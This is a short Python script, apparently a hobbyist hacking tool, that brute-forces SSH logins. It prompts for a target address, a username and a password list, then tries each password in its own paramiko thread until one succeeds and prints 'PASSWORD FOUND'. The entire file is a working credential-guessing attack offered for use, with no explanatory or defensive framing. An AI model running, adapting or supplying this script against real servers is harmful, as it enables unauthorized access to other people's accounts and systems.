import threading
import time

import os
import paramiko
import sys
import termcolor

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()  # two lines to before we connect,declare ssh client
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password, banner_timeout=60)
        stop_flag = 1
        print(termcolor.colored(('[!!] PASSWORD FOUND:' + password), 'green'))
    except:
        print(termcolor.colored(('[+] Incorrect login try with password:' + password), 'red'))
    ssh.close()


host = input("[+] Target Address :")
username = input("[+]Enter Username:")
input_file = input("[+]Enter Password file :")
print('\n')

if os.path.exists(input_file) == False:
    print('[+]That file path doesnt exist')
    sys.exit(1)

print('" " " Starting Threaded SSH brute Force On:' + host + ' WIth Account: ' + username + '" " "')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
